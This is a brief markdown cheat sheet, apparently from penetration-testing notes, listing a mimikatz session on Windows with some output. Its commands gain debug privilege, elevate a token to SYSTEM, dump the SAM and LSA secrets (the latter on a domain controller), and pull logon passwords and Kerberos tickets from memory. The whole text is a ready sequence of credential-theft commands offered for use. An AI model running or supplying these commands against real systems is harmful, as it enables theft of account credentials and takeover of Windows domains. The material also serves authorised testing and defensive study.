# mimikatz.exe

```text
> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM
[...]

mimikatz # lsadump::sam
[...]

mimikatz # sekurlsa::logonpasswords

mimikatz # sekurlsa::tickets

mimikatz # lsadump::lsa /patch (on DC)

```

